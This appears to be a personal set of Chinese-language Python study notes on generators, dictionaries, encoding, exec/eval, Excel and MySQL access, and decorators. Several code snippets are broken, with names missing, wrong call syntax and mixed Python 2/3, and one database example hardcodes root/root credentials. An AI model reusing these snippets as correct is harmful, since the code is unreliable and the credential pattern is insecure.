     生成器是迭代器,但你只能遍历它一次(iterate over them once) 因为生成器并没有将所有值放入内存中,而是实时地生成这些值
     >>> mygenerator = (x*x for x in range(3))
      >>> for i in mygenerator:
             print(i)
      0
      1
      4
      这和使用列表解析地唯一区别在于使用()替代了原来的[]
      注意,你不能执行for i in mygenerator第二次,因为每个生成器只能被使用一次: 计算0,并不保留结果和状态,接着计算1,然后计算4,逐一生成
97.yield 的意义与作用？
     yield是一个关键词,类似return, 不同之处在于,yield返回的是一个生成器
     >>> def createGenerator():
             mylist = range(3)
             for i in mylist:
                 yield i*i
         
      >>> mygenerator = createGenerator() # create a generator
      >>> print(mygenerator) # mygenerator is an object!
      <generator object createGenerator at 0xb7555c34>
      >>> for i in mygenerator:
              print(i)
      0
      1
      4
      这个例子并没有什么实际作用,仅说明当你知道你的函数将产生大量仅被读取一次的数据时,使用生成器将是十分有效的做法
     要掌握yield,你必须明白 - 当你调用这个函数,函数中你书写的代码并没有执行。这个函数仅仅返回一个生成器对象 这有些狡猾 :-)
     然后,在每次for循环使用生成器时,都会执行你的代码 然后,是比较困难的部分：
     第一次函数将会从头运行,直到遇到yield,然后将返回循环的首个值. 然后,每次调用,都会执行函数中的循环一次,返回下一个值,直到没有值可以返回
     当循环结束,或者不满足"if/else"条件,导致函数运行但不命中yield关键字,此时生成器被认为是空的,然后就结束迭代
98.迭代器的内部机制
     迭代过程包含可迭代对象(实现__iter__()方法) 和迭代器(实现__next__()方法)
99.字典批量添加或更新
     d['key'] = 'newvalue'
      #另一个字典
     d.update({'key':'newvalue'})  #这里支持一整组值
     #元组列表
     d.update( [ ('a',1), ('b',2) ] ) #每个元组两个元素,(key,value)
      #**key
      d.update(c=3, e=4)
      d.setdefault('', 'ken') #若原来没有,设置,否则原值不变
100.字典删除
     del d['key']
      value = d.pop('key') #删除并返回值
     d.clear() #清空
}

迭代器与生成器{
# http://www.cnblogs.com/liluning/p/7274862.html


def func():
    # for i in 'AB':
    #     yield i
    yield from 'AB'  # 等同于上面两行
    yield from [1, 2, 3]
g = func()
print(next(g))
print(next(g))
print(next(g))
print(next(g))
print(next(g))
# print(next(g))
#
import timeit
# 列表解析
print(sum([i for i in range(100000)]))  # 内存占用大,机器容易卡死

# 生成器表达式
print(sum(i for i in range(100000)))  # 几乎不占内存

print(timeit.timeit(stmt="sum([i for i in range(100000)])", number=1000))
print(timeit.timeit(stmt="sum(i for i in range(100000))", number=1000))

"""
迭代器大部分都是在python的内部去使用的,我们直接拿来用就行了
我们自己写的能实现迭代器功能的东西就叫生成器。

迭代器协议：必须拥有__iter__方法和__next__方法

把列表解析的[]换成()得到的就是生成器表达式
列表解析与生成器表达式都是一种便利的编程方式,只不过生成器表达式更节省内存
生成器表达式 具有延迟计算,一次返回一个结果。也就是说,它不会一次生成所有的结果,这对于大数据量处理,将会非常有用。
"""
# 判断是否可迭代和迭代器的简洁方法：iterator：迭代器；迭代程序   iterable：可迭代的；迭代的；
from collections import Iterable
from collections import Iterator
s = 'abc'
print(isinstance(s, Iterable))
print(isinstance(s, Iterator))
print(isinstance(iter(s), Iterator))


a = [i for i in range(10)]  # 列表解析
print("列表解析:", a)
b = (i for i in range(10))  # 生成器表达式
print("生成器表达式:", b)
print(next(b))
print(next(b))
print(next(b))
print(next(b))

}

python 学习手册摘要{

Python里一切都是对象
动态语言里,一旦创建了对象,对象就会和操作集绑定

字符编码{
py3也有两种数据类型：str和bytes；str类型存unicode数据,bytse类型存bytes数据,Python 3不会以任意隐式的方式混用str和bytes,正是这使得两者的区分特别清晰。
在计算机内存中,统一使用Unicode编码,当需要保存到硬盘或者需要传输的时候,就转换为UTF-8编码。
用记事本编辑的时候,从文件读取的UTF-8字符被转换为Unicode字符到内存里,编辑完成后,保存的时候再把Unicode转换为UTF-8保存到文件。
Unicode与utf8的关系：一言以蔽之,Unicode是内存编码表示方案(是规范),而UTF是如何保存和传输Unicode的方案(是实现)这也是UTF与Unicode的区别。
为了避免乱码问题,应当始终坚持使用UTF-8编码对str和bytes进行转换
#http://www.cnblogs.com/yuanchenqi/articles/5956943.html 很好的文章,解释得很清楚
写的文本基本上全部是英文的话,用Unicode编码比ASCII编码需要多一倍的存储空间,在存储和传输上就十分不划算。所以,又出现了把Unicode编码转化为"可变长编码"的UTF-8编码。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节,常用的英文字母被编码成1个字节,汉字通常是3个字节,只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符,用UTF-8编码就能节省空间
}

#python 变量的传递
在python中,类型属于对象,变量是没有类型的
a="aaaaaa" #一个指向string数据类型的a
a=1 	   #一个指向int数据类型的a
a指向的对象变了,可以看出变量a没有固定的类型,所有的变量都可以理解 是内存中一个对象的"引用"。

python中变量都被视为对象的引用。python函数调用传递参数的时候,不允许程序员选择传值还是传引用,python参数传递采用的都是"传对象引用"的方式。
这种方式相当于传值和传引用的结合,如果函数收到的是一个可变对象(比如字典或者列表)的引用,就能修改对象的原始值——相当于通过"传引用"来传递对象；如果函数收到的是一个不可变对象(比如数字、字符串或元组)的引用,就不能直接修改原始对象——相当于"传值"来传递对象。
python一般内部赋值变量的话,都是个引用变量,和c语言的传地址概念差不多。可以通过id(x)来查询x的内存地址。
如果 a=b的话,a和b的地址相同；如果只是想拷贝,就要用 a = b[:]
>>> a=[1,2,3]
>>> id(a)
46049880
>>> b=a
>>> id(b)
46049880
>>> c=a[:]
>>> id(c)
46500200
>>> a[1]=2222
>>> id(a)
46049880
>>> id(b)
46049880
>>> b
[1, 2222, 3]
>>>
>>> c[2]=3333
>>> c
[1, 2, 3333]
>>> id(c)
46500200

def Func(x):
    x = 20
a = 10
Func(a)
print(a)
输出10, 调用Func(a)时,Func内部的x变量指向整型对象10,
(即为整型对象10的引用)。在Func内部尝试修改一个不可变对象,
会使得Func内部的x指向一个新的对象20,而外部的变量a仍然指向不可变对象10.

def Func2(x):
    x[0] = 20

a = [1,2,3]
Func2[a]
print(a)
#结果为 [20, 2, 3]。

#为一个定义在函数外的变量赋值
a=[1,2,3]
def aa():
      global a
      a=[2,3,4]
      #global a=[2,3,4] #这样是错误的！
      print(a)
print(a)
aa()
print(a)

'''
[1, 2, 3]
[2, 3, 4]
[2, 3, 4]
'''


#枚举
enumerate(x) #x为列表或者元组,对于每次迭代,返回 index, value 元组,index为下标,而value为x内的下标为index的对应的数值

for (index, value) in enumerate(x):
　　print index, value

zip(x1, x2   )
如果有多个列表x1,x2   . 每个序列的元素个数相同,可以通过zip来迭代取出所有序列的相同位置的元素。
ta = [1,2,3]
tb = [9,8,7]
tc = ['a','b','c']
for (a,b,c) in zip(ta,tb,tc):
    print(a,b,c)

#yield的使用,后面有更详细的解释和实例
生成器可以构造一个用户自定义的循环对象。生成器的编写方法和函数定义类似,只是在return的地方改为 yield。生成器中可以有多个yield,当生成器遇到一个yield时,会暂停运行生成器,返回yield后面的值。当再次调用生成器的时候,会从刚才暂停的地方继续运行,直到下一次yield。生成器自身构成一个循环器,每次循环使用一个yield返回的值。
def gen():
    a = 100
    yield a
    a = a*8
    yield a
    yield 1000

list(gen())	#[100,800,1000]
for i in gen():
    print i

def gen():
    for i in range(4):
        yield i

或者可以写成生成器表达式
G = (x for x in range(4))

#生成器表达式
a = (x for x in range(4))
#表推导
b = [x**2 for x in range(4)]

>>> a
<generator object <genexpr> at 0x00406788>
>>> list(a)
[1, 2, 3]
>>>
>>> b=[x for x in range(1,4)]
>>> b
[1, 2, 3]
>>> type(a)
<class 'generator'> #生成器
>>> type(b)
<class 'list'>


#map的使用
re = map((lambda x:x + 3), [1,3,4,5])
>>> list(re)
[4, 6, 7, 8]
这里参数1为lambda定义的函数对象,参数2为一个包含多个元素的表。map()的功能是将函数对象依次作用于表的每一个元素,每次作用的结果存储于返回的表re中。map是通过读入的函数来操作数据。
如果作为参数的函数对象有多个参数,可以使用下面的方式,向map()传递函数参数的多个参数：
re = map((lambda x, y: x + y), [1,2,3], [6,7,8])
>>> list(re)
[7, 9, 11]
map()将每次从两个表中分别取出一个元素,带入lambda所定义的函数。
在python3中,map()返回值不是一个表,而是一个循环对象。


#filter 的使用  过滤器
filter()和map()类似,将作为参数的函数对象作用于多个元素。如果函数对象返回的为True,则该次的元素被存储于返回的表中。filter通过读入的函数来筛选数据。在python3中,filter返回的不是表,而是循环对象。

def func(a):
    if a > 100：
        return True
    else:
        return False
print filter(func, [10, 56, 101, 100])

>>> list(filter(f,[1,2333,34,435,121,22]))
[2333, 435, 121]

#id 的用法
在python中通过执行内建函数 id(obj) 可以获得对象obj在内存中的地址。在python中,整数和短小的字符,python都会缓存这些对象,以便重复使用。当我们创建多个等于1的引用时,实际上是让所有这些引用指向同一个对象。
#通过 is 关键字可以判断两个引用是否指向同一个对象

#getrefcount() 引用计数器
在python中,每个对象都有存有指向该对象的引用总数,即引用计数。通过sys包中的getrefcount()方法可以查看某个对象的引用计数。需要注意的是当使用某个引用作为参数,传递给getrefcount()时,参数实际上创建了一个临时的引用。因此,getrefcount()所得到的结果,会比期望的多1。

#使用del关键字删除某个引用

Python内置函数里,exec 关键字执行多行代码片段,eval() 函数通常用来执行一条包含返回值的表达式
exec
>>> code = """
    def test():
        print "this is a test by abeen"
    """
>>> test() #Error:  'test' is not defined
>>> exec code
>>> test() # test()成功执行
this is a test by abeen
>>> exec('print("aaa")')
aaa
>>>exec(open(file).read())

eval
eval() 和 execfile() 都有 "globals, locals" 参数,用于传递环境变量,默认或显式设置为 None 时都直接使用 globals() 和 locals() 获取当前作用域的数据。
>>> a =10
>>> eval("a+3") #默认传递环境变量
13
>>> evla("a+3")#Error:  'evla' is not defined
>>> eval("a+3")
3
>>> eval("a+3",{},{"a":100}) #显示传递环境变量
103

#将代码编译成字节码
内置函数 compile() 将一段源代码编译成 codeobject,然后可以提交给 exec 执行
compile(source, file, mode[, flags[, dont_inherit]])
参数 file 只是用来在编译错误时显式一个标记,无关输出和存储什么事。mode 可以是 "exec"(多行代码组成的代码块)、"eval"(有返回值的单行表达式)、"single"(单行表达式)。

>>> source = """
def test():
	print("dawdsfg")
"""
>>> code=compile(source,"test.py","exec")
>>> exec(code)
>>> test()
dawdsfg

>>> code=compile ("print('这样也行')",'test.py','exec')
>>> exec(code)
这样也行


print(value,    , sep=' ', end='\n', file=sys.stdout, flush=False)
python print格式化输出{

1. 打印字符串
print ("His  is %s"%("Aviad"))

2.打印整数
print ("He is %d years old"%(25))

3.打印浮点数
print ("His height is %f m"%(1.83))

4.打印浮点数(指定保留小数点位数)
print ("His height is %.2f m"%(1.83))

5.指定占位符宽度
print (":%10s Age:%8d Height:%8.2f"%("Aviad",25,1.83))

6.指定占位符宽度(左对齐)
print (":%-10s Age:%-8d Height:%-8.2f"%("Aviad",25,1.83))

7.指定占位符(只能用0当占位符？)
print (":%-10s Age:%08d Height:%08.2f"%("Aviad",25,1.83))

8.科学计数法
format(0.0015,'.2e')

}
}

IDLE编辑器快捷键{
自动补全代码        Alt+/(查找编辑器内已经写过的代码来补全)
补全提示              Ctrl+Shift+space(默认与输入法冲突,修改之)
(方法：Options->configure IDLE…->Keys-> force-open-completions
提示的时候只要按空格就出来对于的,否则翻上下键不需要按其他键自动就补全了)

后退                    Ctrl+Z

重做                    Ctrl+Shift+Z
加缩进                 Ctrl+]
减缩进                 Ctrl+[
加注释                 Alt+3
去注释                 Alt+4

Python Shell快捷键

自动补全同上
上一条命令           Alt+P
下一条命令           Alt+N
}

读写execl{
https://pypi.python.org/pypi  #库下载网址
#读是openpyxl 写是xlsxwriter 比较新的处理execl的库,好像xlrd只支持到execl 2007版本,openpyxl支持到最新的
#http://www.cnblogs.com/guanfuchang/p/5970435.html
#读
1、导入模块
      import xlrd
2、打开Excel文件读取数据
       data = xlrd.open_workbook('excel.xls')
3、获取一个工作表
1  table = data.sheets()[0]          #通过索引顺序获取
2  table = data.sheet_by_index(0) #通过索引顺序获取
3  table = data.sheet_by_(u'Sheet1')#通过名称获取
4、获取整行和整列的值(返回数组)
         table.row_values(i)
         table.col_values(i)
5、获取行数和列数　
        table.nrows
        table.ncols
6、获取单元格
　　table.cell(0,0).value

table.cell(2,3).value
 #写

　写excel表要用到xlwt模块,官网下载(http://pypi.python.org/pypi/xlwt)。大致使用流程如下：
1、导入模块
　　import xlwt
2、创建workbook(其实就是excel,后来保存一下就行)
　　workbook = xlwt.Workbook(encoding = 'ascii')
3、创建表
 　　worksheet = workbook.add_sheet('My Worksheet')
4、往单元格内写入内容
　　worksheet.write(0, 0, label = 'Row 0, Column 0 Value')
5、保存
　　workbook.save('Excel_Workbook.xls')


#复制execl中的部分数据到另一份execl中的相同位置
import xlrd
import xlwt
import xlutils.copy
path1="E:\\安全测试\\中央软件院网络安全需求基线V2.0-API管理子系统.xlsx"
path2="E:\\安全测试\\2222.xlsx"
workbook1 = xlrd.open_workbook(path1)
workbook2 = xlrd.open_workbook(path2)

print(workbook1.sheet_s())
sheet1 = workbook1.sheet_by_('应用层安全') # 根据sheet索引或者名称获取sheet内容
print (sheet1.,sheet1.nrows,sheet1.ncols) # sheet的名称,行数,列数
cols0 = sheet1.col_values(0) # 获取第1列内容,用例编号
cols9 = sheet1.col_values(9) # 获取第9列内容,产品状态
cols10 = sheet1.col_values(10) # 获取第10列内容,举证说明 记得需要打开所有隐藏才能正确看到
a=[]
for x,y,z in zip(cols0,cols9,cols10):
	print(x,y,z)
	a.append([x,y,z])

workbook2 = xlrd.open_workbook(path2)
sheet2 = workbook2.sheet_by_('Sheet1')
cols02 = sheet2.col_values(0) # 获取第1列内容,用例编号
cols92 = sheet2.col_values(14) # 获取第9列内容,产品状态
cols102 = sheet2.col_values(15) # 获取第10列内容,举证说明 记得需要打开所有隐藏才能正确看到
b=[]
for x,y,z in zip(cols02,cols92,cols102):
	print(x,y,z)
	b.append([x,y,z])
#以上已经获取了对应的两份文件的数据信息,下面将第一列的数据相同的对应上,不同的暂时不管
#原始数据
print(b)
e=[]
f=[]
for x,y,z in a:
	e.append(x)

for x,y,z in b:
	f.append(x)
#查找对应位置上的数据
for x,y in enumerate(e):
        if e[x] in f:
                q=f.index(e[x]) #源数据在目标数据中的索引位置
                b[q][1]=a[x][1]
                b[q][2]=a[x][2]
#修改后的数据
print(b)
#将修改后的数据写入到目标文件的对应位置
path3="E:\\安全测试\\2222.xls"
workbook3 = xlrd.open_workbook(path3,formatting_info=True)
workbook4 = xlutils.copy.copy(workbook3)
wd = workbook4.get_sheet(0)

for x in range(len(b)):
	wd.write(x, 14, b[x][1])
	wd.write(x, 15, b[x][2])

workbook4.save(path3)

}

操作数据库{

import pymysql
conn = pymysql.connect(host='10.175.102.222', port=15432, user='root', passwd='root',db='wso2am_db',charset='utf8')
cursor = conn.cursor()
cursor.execute("select * from am_api")
row_1 = cursor.fetchone()
(2413, 'provider', 'add_api_01bc7e9', 'v1.0', '/gts/delete_api_01/698e9')
>>> type(row_1)
<class 'tuple'>

>>> for x in range(1,50):
	print(cursor.fetchone())

conn.commit()
cursor.close();
conn.close();


#具体情况看博客园
conn = pymysql.connect(host='10.175.102.222', port=15432, user='root', passwd='root')
cur.execute('delete from user where id=20')                  # 删除一条记录
cur.execute("update user set ='a' where id=20")          # 更细数据
sqlresult = cur.fetchall()                                   # 接收全部返回结果
conn.commit()                                                # 提交
cur=conn.cursor()                                            # 定义游标
conn.select_db('fortress')                                   # 选择数据库
}

目录中的斜杠们{
python读文件需要输入的目录参数,列出以下例子：
path = r"C:\Windows\temp\readme.txt"
path1 = r"c:\windows\temp\readme.txt"
path2 = "c:\\windows\\temp\\readme.txt"
path3 = "c:/windows/temp/readme.txt"
打开文件函数open()中的参数可以是path也可以是path1、path2、path3。
}

#***********************************装饰器部分开始***********************************
类中各种方法、各种变量和装饰器{
#装饰器 的作用就是为已经存在的函数或对象添加额外的功能。

1.静态方法,可以认为是一种全局方法,因为它不需要类实例化就能访问,和模块内的方法没什么区别,可以通过类和实例进行调用,它不能访问实例变量。当然,但能够通过类名访问类变量,如MyClass.val1。
2.类方法,类似是个全局方法,它也能如静态方法那样被类调用,也能被实例调用,不同的是它通过实例来访问类变量,有类变量cls传入,并且有子类继承时,调用该类方法时,传入的类变量cls是子类,而非父类,如x.val1。
3.实例方法,实例方法只能通过实例访问,它能够访问实例变量(公有)和类变量。私有方法,无法被类和实例调用。
4.类变量,能够被类、类方法、实例和实例方法等访问。且在类和实例中进行传递(不停累加),如val4。
5.实例变量(公有),能被实例和实例方法访问,但不能被类和类方法访问。
6.实例变量(私有),不能被任何实例访问,但我们可以通过装饰器对其增加get/set方法来进行操作,具体在下面介绍。
7.私有属性,通过在变量和方法前增加__(两个下划线)来定义。

#内置的装饰器有三个,分别是staticmethod、classmethod和property,作用分别是把类中定义的实例方法变成 静态方法、类方法和类属性
# coding: utf-8
class MyClass:
    '''I simple example class'''
    val1 = 'Value 1'            #类变量
    val4 = 1
    def __init__(self):
        self.val2 = 'Value 2'   #公有实例变量
        self.__val3 = 'Value 3' #私有实例变量

    def __func():
        print( 'val1 : ', MyClass.val1)
        print( 'static method cannot access val2')
        print( 'static method cannot access __val3')
        print( 'val4 : ', MyClass.val4)
        MyClass.val4 = ((MyClass.val4 + 1))

    smd = staticmethod(__func)

    def __func2(cls):
        print( 'val1 : ', cls.val1)
        print( 'class method cannot access val2')
        print( 'class method cannot access __val3')
        print( 'val4 : ', cls.val4)
        cls.val4 = ((cls.val4 + 1))

    cmd = classmethod(__func2)

    def func3(self):
        print( 'val1 : ', self.val1)
        print( 'val2 : ', self.val2)
        print( 'instance method cannot access __val3')
        print( 'val4 : ', self.val4)
        self.val4 = ((self.val4 + 1))

print ('--------------------MyClass.smd()-------------------')
MyClass.smd()        #类调用静态方法
print ('--------------------MyClass.cmd()-------------------')
MyClass.cmd()        #类调用类方法
#MyClass.func3()        #类无法直接调用实例方法

x = MyClass()
print( '--------------------x.smd()-------------------')
x.smd()            #实例调用静态方法
print( '--------------------x.cmd()-------------------')
x.cmd()            #实例调用类方法
print ('--------------------x.func3()-------------------')
x.func3()        #实例调用实例方法


#优化后,使用装饰器

# coding: utf-8
class MyClass:
    '''my simple example class'''
    val1 = 'Value 1'                #类变量
    val4 = 1                        #类变量
    def __init__(self):
        self.val2 = 'Value 2'       #公有实例变量
        self.__val3 = 'Value 3'     #私有实例变量

    def func3(self):                #定义实例方法
        print( 'val1 : ', self.val1)
        print( 'val2 : ', self.val2)
        print( 'instance method cannot access __val3')
        print( 'val4 : ', self.val4)
        self.val4 = ((self.val4 + 1))

    @classmethod                    #定义类方法
    def func2(cls):
        print( 'val1 : ', cls.val1)
        print( 'class method cannot access val2')
        print( 'class method cannot access __val3')
        print( 'val4 : ', cls.val4)
        cls.val4 = ((cls.val4 + 1))

    @staticmethod                   #定义静态方法
    def func():
        print( 'val1 : ', MyClass.val1)
        print( 'static cannot access val2')
        print( 'static method cannot access __val3')
        print( 'val4 : ', MyClass.val4)
        MyClass.val4 = ((MyClass.val4 + 1))

    @property                       #私有实例变量get属性
    def val3(self):
        return self.__val3

    @val3.setter                    #私有实例变量set属性
    def val3(self, value):
        self.__val3 = value

    @val3.deleter                   #私有实例变量del属性
    def val3(self):
        del self.__val3


print( '-------------------MyClass.func()------------------')
MyClass.func()

x = MyClass()
print( '-------------------x.func()------------------')
x.func()
print( '-------------------x.func2()------------------')
x.func2()
print( '-------------------x.func3()------------------')
x.func3()

print( '')
print( 'MyClass().val3 : ',MyClass().val3  )      #类调用property
MyClass().val3 = 'New Value'            #类调用setter
print( 'after "MyClass().val3 = New Value" val3 :', MyClass().val3)

print('')
print( 'val3 : ',x.val3 )            #实例调用property
x.val3 = 'New Value'                #实例调用setter
print( 'after "x.val3 = New Value" val3 :', x.val3 )
del x.val3                    #实例调用deleter
#print( 'after "del x.val3"  val3 : ', x.val3 )



#装饰器
http://www.cnblogs.com/cicaday/p/python-decorator.html
{
#使用装饰函数在函数执行前和执行后分别附加额外功能
'''示例2: 替换函数(装饰)
装饰函数的参数是被装饰的函数对象,返回原函数对象
装饰的实质语句: myfunc = deco(myfunc)'''

def deco(func):
    print("before myfunc() called.")
    func()
    print("  after myfunc() called.")
    return func

def myfunc():
    print(" myfunc() called.")

myfunc = deco(myfunc)

myfunc()
myfunc()
#使用语法糖@来装饰函数
# -*- coding:gbk -*-
'''示例3: 使用语法糖@来装饰函数,相当于"myfunc = deco(myfunc)"
但发现新函数只在第一次被调用,且原函数多调用了一次'''
#只有一个return时
def deco(func):
    print("before myfunc() called.")
    func()
    print("  after myfunc() called.")
    return func

@deco
def myfunc():
    print(" myfunc() called.")

myfunc()
myfunc()
#使用内嵌包装函数来确保每次新函数都被调用
'''示例4: 使用内嵌包装函数来确保每次新函数都被调用,
内嵌包装函数的形参和返回值与原函数相同,装饰函数返回内嵌包装函数对象'''
#用两个return时
def deco(func):
    def _deco():
        print("before myfunc() called.")
        a=func()
        print("  after myfunc() called.")
        return a
        # 不需要返回func,实际上应返回原函数的返回值 《=== 存疑
    return _deco

@deco
def myfunc():
    print(" myfunc() called.")
    return 'ok'

print(myfunc())
print("=======")
print(myfunc())
#对带参数的函数进行装饰
'''示例5: 对带参数的函数进行装饰,
内嵌包装函数的形参和返回值与原函数相同,装饰函数返回内嵌包装函数对象'''

def deco(func):
    def _deco(a, b):
        print("before myfunc() called.")
        ret = func(a, b)
        print("  after myfunc() called. result: %s" % ret)
        return ret
    return _deco

@deco
def myfunc(a, b):
    print(" myfunc(%s,%s) called." % (a, b))
    return a + b

print(myfunc(1, 2))
print("=====")
print(myfunc(3, 4))
#对参数数量不确定的函数进行装饰
'''示例6: 对参数数量不确定的函数进行装饰,
参数用(*args, **kwargs),自动适应变参和命名参数'''

def deco(func):
    def _deco(*args, **kwargs):
        print("before %s called." % func.____)
        ret = func(*args, **kwargs)
        print("  after %s called. result: %s" % (func.____, ret))
        return ret
    return _deco

@deco
def myfunc(a, b):
    print(" myfunc(%s,%s) called." % (a, b))
    return a+b

@deco
def myfunc2(a, b, c):
    print(" myfunc2(%s,%s,%s) called." % (a, b, c))
    return a+b+c

print(myfunc(1, 2))
print(myfunc(3, 4))
print(myfunc2(1, 2, 3))
print(myfunc2(3, 4, 5))



}

#总结 ： 在不改变原函数myfunc的情况下附加新功能,不管myfunc中有没有return语句,deco中都应该有两个return,第一个返回用来返回传入的myfunc的结果,第二个用来调用_deco,并返回_deco的结果。
}

函数的使用与装饰器{

import time
def shoe_time(f):
    print("33333")
    def inner():
        start = time.time()
        f()
        print("22222")
        end = time.time()
        print(end-start)
    print("1111")
    return inner

def foo():
    print("foo      ")
    time.sleep(1)

#嵌套函数
print("===========0")
foo
print(type(foo))
print("===========0")
a=shoe_time(foo)
a()
print(type(a))
print("===========0")
shoe_time(shoe_time(foo))
print("===========0")
#嵌套函数的总结：先计算最内部的表达式,一层一层剥离。

#foo 是函数,foo()是运行这个foo函数
print("===========11")
foo()
print("===========11")
a=shoe_time(foo())
#a()   #其实a 里什么也没接收到,所以不能运行a()函数
print('aaa:',a)
print(type(a))
print("===========11")
shoe_time(shoe_time(foo()))
print("===========11")
###############上面的例子都懂了后,开始下面的装饰器例子##################
print("===========装饰1")
foo=shoe_time(foo)  #装饰时shoe_time会运行一次,返回inner函数,给foo,其实就是用inner装饰了foo
print("===========装饰1.0")
foo()
print("===========装饰1")
#@shoe_time  等同于bar = shoe_time(bar)
def bar():
    print("bar      ")
    time.sleep(2)

bar=shoe_time(bar)
bar()
print("===========装饰2")
foo()       #被装饰后,函数可以重复调用,且不会失效,全靠了 return
bar()
foo()
bar()
}

两层装饰的运行顺序{
#两层包装,加入全局变量x 和 自定义值 y 用来跟踪函数运行过程
global x
x=1
def ab1(y):
    global x
    print ('begin1,x=',x)
    print("包装时的参数1:",y)
    def ab2(func):
        global x
        print ('begin2,x=',x)
        print("包装时的参数2:",y)
        def ab3(*args, **kwargs):
            global x
            content = func(*args, **kwargs)
            x=x+1
            print ('begin3,x=',x)
            print("包装时的参数3:",y)
            return content
        x=x+1
        print ('end2,x=',x)
        return ab3
    x=x+1
    print ('end1,x=',x)
    return ab2

#尝试剥离每一层装饰
test1=ab1('1111') # >>返回是的已传入11111111111的ab2函数 >>return ab2
print(type(test1))
print("===========0")
def hello(a,b):
       return ("a+b=",a+b)

test2=ab1('2222')(hello) # >>返回是的已传入hello的ab3函数 >>return ab3
print(type(test2))
print("===========1")

@ab1('3333')
# hello=ab1('3333')(hello) 结合y值的运行,可以将装饰分成两个包装步骤:
#可以理解成ab1先自己包装了'3333',返回ab1('3333')也就是ab2(func),但fun未传入,ab1('3333')(hello)再次包装hello传入func
#返回的是 ab3(*args, **kwargs)但(*args, **kwargs)未传入,hello=ab3(*args, **kwargs),包装后调用hello(a=1,b=2)就是传入参数的过程
def hello(a,b):
       return ("a+b=",a+b)

print("===========2")
print(hello(a=1,b=2)) #ab3函数,第一次运行,包装后就不会再运行ab3包装外的语句
print("===========3")
print(hello(a=1,b=2)) #ab3函数,第二次运行,包装后就不会再运行ab3包装外的语句
print("===========4")
#对比 不包装
def hello(a,b):
       return ("a+b=",a+b)

print(hello(a=1,b=2))



}

from functools import wraps的用处{

from functools import wraps

def html_tags(tag_):
    print ('begin 1')
    def wrapper_(func):
        print ('begin 2')
        #@wraps(func)   不使用functools.wraps(装饰包装器的装饰器)
        def wrapperssss(*args, **kwargs):
            content = func(*args, **kwargs)
            print ("<{tag}>{content}</{tag}>".format(tag=tag_, content=content))
        print ('end 2')
        return wrapperssss
    print ('end 1')
    return wrapper_

@html_tags('b')
def hello(='Toby'):
    print( 'Hello {}!'.format())

print("------------")
hello()
print("------------")
hello()

help(hello)

help(hello)的返回:
Help on function wrapperssss in module __main__:

wrapperssss(*args, **kwargs)
    #@wraps(func)

#对比组

from functools import wraps

def html_tags(tag_):
    print ('begin 1')
    def wrapper_(func):
        print ('begin 2')
        @wraps(func) #使用装饰器的装饰
        def wrapperssss(*args, **kwargs):
            content = func(*args, **kwargs)
            print ("<{tag}>{content}</{tag}>".format(tag=tag_, content=content))
        print ('end 2')
        return wrapperssss
    print ('end 1')
    return wrapper_

@html_tags('b')
def hello(='Toby'):
    print( 'Hello {}!'.format())

print("------------")
hello()
print("------------")
hello()

help(hello)

help(hello)的返回:
Help on function hello in module __main__:

hello(='Toby')

#另一个例子

# -*-coding=utf-8 -*-

import functools, time
'''
一个函数执行前打印开始执行,执行完后打印执行完成,记录执行时间
'''

def log(text):
    if callable(text):  # 参数如果是函数,说明装饰器不带参传过来,text是一个函数
        @functools.wraps(text)
        def wrapper(*args, **kwargs):
            start = time.clock()
            print ('这是不带参数的装饰器,开始执行')
            f = text(*args, **kwargs)  #执行本身的函数 text()
            end = time.clock()
            print ("结束执行:", end - start)
            return f  # 返还原函数
        return wrapper

    elif not callable(text):  # text是参数,不是函数
        def decarator(func):
            @functools.wraps(func)
            def warpper(*args, **kwargs):
                start = time.clock()
                print ('这是带参数的装饰器,开始执行,参数为：'+text)
                print ('这里我们尝试修改一下被装饰函数的参数值')
                print(type(args)) # tuple不可修改         ,所以我们直接赋值
                args=(5,5)
                f = func(*args, **kwargs)
                end=time.clock()
                print ("结束执行:",end-start)
                return f  #返还原函数
            return warpper
        return decarator
    else:
        print ('请检查是否正确')

#先拆解装饰器的参数,再拆解被装饰的函数,再拆解被装饰函数的参数(一般这一步没有)

@log
def add1(x,y):
    print (x+y)

@log('222')
def add2(x,y):
    print  (x+y)

add1(1,2)
add2(2,3)

help(add1)
help(add2)



}

多种装饰器的总结{

# 1. 普通装饰器,单功能附加,任意参数,需要2个return
def debug(func):
    def wrapper(*args, **kwargs):  # 指定宇宙无敌参数
        print ("[DEBUG]: enter {}()".format(func.____))
        print ('Prepare and say   ')
        return func(*args, **kwargs)
    return wrapper  # 返回

@debug
def say(something):
    print ("hello {}!".format(something))

say('hello,1层装饰器')

# 2. 两层装饰
#进入某个函数后打出log信息,而且还需指定log的级别
def logging(level):
    def wrapper(func):
        def inner_wrapper(*args, **kwargs):
            print ("[{level}]: enter function {func}()".format( level=level, func=func.____))
            return func(*args, **kwargs)
        return inner_wrapper
    return wrapper
#需要3个return
@logging(level='INFO')
def say(something):
    print ("say {}!".format(something))

# 如果没有使用@语法,等同于
# say = logging(level='INFO')(say)
#@logging(level='DEBUG'),它其实是一个函数,会马上被执行,它返回的结果是一个装饰器,再去装饰do()
@logging(level='DEBUG')
def do(something):
    print ("do {}   ".format(something))

print("2层装饰器")
say('hello')
do("my work")


# 3. 带参数的类装饰器
class logging(object):
    def __init__(self, level='INFO'):
        self.level = level

    def __call__(self, func): # 接受函数
        def wrapper(*args, **kwargs):
            print( "[{level}]: enter function {func}()".format( level=self.level, func=func.____))
            func(*args, **kwargs)
        return wrapper  #返回函数

@logging(level='INFO')
def say(something):
    print ("say {}!".format(something) )

say('hello,类装饰器！')

# 4. 包装时需要几个return ,以及包装函数中,各层次的运行顺序  举例如下：
def html_tags(tag_):
    print ('begin 1')
    def wrapper_(func):
        print ('begin 2')
        def wrapper(*args, **kwargs):
            content = func(*args, **kwargs)
            print ("<{tag}>{content}</{tag}>".format(tag=tag_, content=content))
        print ('end 2')
        return wrapper
    print ('end 1')
    return wrapper_

@html_tags('b')
def hello(='Toby'):
    return 'Hello {}!'.format()

#print(hello())
#print(hello())

#不包装
def hello(='Toby'):
    return 'Hello {}!'.format()

#print(hello())

#上面的包装方式,少了一个return,包装时代参数后被包装的函数有返回值时被包装后会被改变成无返回值的函数,原函数就有一个return
#两层包装

def a_b(tag_):
    print ('begin 1')
    def ab(func):
        print ('begin 2')
        def and1(*args, **kwargs):
            content = func(*args, **kwargs)
            return content
        print ('end 2')
        return and1
    print ('end 1')
    return ab

@a_b('b')
def hello(a=1,b=2):
       return ("a+b=",a+b)

